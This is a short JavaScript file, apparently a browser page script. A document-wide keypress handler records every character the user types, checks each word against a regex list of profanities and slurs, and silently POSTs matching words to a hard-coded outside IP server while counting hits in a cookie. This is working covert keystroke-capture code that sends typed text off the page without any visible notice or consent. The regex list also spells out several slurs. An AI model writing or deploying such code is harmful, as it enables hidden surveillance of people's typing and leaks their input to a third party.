var word = new Array();

function sendMethod(){
	var cookie = document.cookie.split(";");
	var count;
	for(var i=0;i<cookie.length;i++){
		if(cookie[i].trim().indexOf("count")==0)
			count= cookie[i].substring("count".length,cookie[i].length);		
	}
	
	var str ="";
	var i;
	for(i=0;i<word.length;i++){
		str= str+word[i];
	}
	word.length=0;
	if(checkword(str)){
		console.log(str);
		$.post("http://107.170.73.156:8001/userswore/", {swearword:str},
        function() {
			cnt = parseInt(count)+1;
        document.cookie="count="+cnt+"; expires=Thu, 18 Dec 2015 12:00:00 GMT; path=/";
	}	);}
}


document.onkeypress = function(e) {
    e = e || window.event;
    var charCode = (typeof e.which == "number") ? e.which : e.keyCode;
    if (charCode) {
	if(charCode == " ".charCodeAt(0)){
	sendMethod()
	}
	else{
	word.push(String.fromCharCode(charCode));
	}
    }

}
var checkword = function(e){
	var str = e; 
	var res = (str.match(/fuck/g)||str.match(/shit/g)||str.match(/fuck/g)||
	str.match(/cunt/g)||str.match(/ass/g)||str.match(/cum/g)||
	str.match(/whore/g)||str.match(/slut/g)||str.match(/fag/g)||
	str.match(/kike/g)||str.match(/spick/g)||str.match(/dick/g)||
	str.match(/bastard/g)||str.match(/fuck/g));
	var temp = res;
	if (res!==null) {
		return true;
	}
	return false;
}
